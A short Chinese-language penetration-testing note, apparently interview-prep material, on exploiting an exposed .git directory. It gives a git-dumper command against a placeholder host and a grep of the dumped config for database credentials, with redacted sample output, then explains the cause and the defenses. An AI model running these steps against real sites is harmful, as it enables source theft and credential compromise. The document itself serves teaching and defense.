# 02 源码泄露

## 漏洞发现

在目录扫描中发现 `/.git/` 可访问，说明网站源码通过 Git 版本控制系统泄露。

## 漏洞利用

使用 `git-dumper` 工具将源码下载到本地：

```bash
git-dumper http://x.x.x.x:800/.git/ /tmp/src_dump
```

## 获取数据库凭证

下载完成后，在源码中寻找配置文件。通常数据库配置位于 `application/database.php` 等路径下。

```bash
cat /tmp/src_dump/application/database.php | grep -E "hostname|database|username|password"
```

输出（已脱敏）：
```text
'hostname' => '127.0.0.1',
'database' => 'xxxx',
'username' => 'root',
'password' => 'root***',
```

通过配置文件直接拿到了数据库的账号和密码。

## 面试复盘 / 经验总结

- **为什么 `.git` 能泄露？** 运维部署时直接把 `.git` 目录放在了 Web 根目录下，没有删除或限制访问。
- **如何防御？** 部署生产环境时删除 `.git` 目录，或在 Nginx/Apache 配置中禁止访问 `.git` 路径。
